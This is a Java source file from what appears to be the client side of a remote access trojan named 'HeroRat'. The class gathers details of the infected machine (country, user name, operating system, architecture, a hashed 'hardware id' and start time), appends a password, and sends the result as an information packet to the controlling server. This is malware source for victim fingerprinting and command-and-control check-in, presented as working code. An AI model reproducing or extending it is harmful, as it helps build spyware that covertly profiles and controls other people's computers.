package net.herorat.features.information;

import java.io.DataOutputStream;

import net.herorat.Main;
import net.herorat.network.Packet;
import net.herorat.network.Packet0Information;
import net.herorat.utils.Crypto;


public class Information
{
	public static void send(DataOutputStream outputstream, String password)
	{
		Packet p = new Packet0Information(outputstream, new String[] { getInformation() + "###" + password });
		p.write();
	}
	
	public static String getInformation()
	{
		String data = getHwid() + "###";
		data += System.getProperty("user.country") + "###";
		data += System.getProperty("user.name")	+ "###";
		data += System.getProperty("os.name") + " " + System.getProperty("os.arch") + "###";
		data += Main.start_time;
		return data;
	}
	
	public static String getHwid()
	{
		String data = System.getProperty("user.country") + "###";
		data += System.getProperty("user.name")	+ "###";
		data += System.getProperty("os.name") + "###";
		data += System.getProperty("os.arch");
		
		return Crypto.md5(data);
	}
}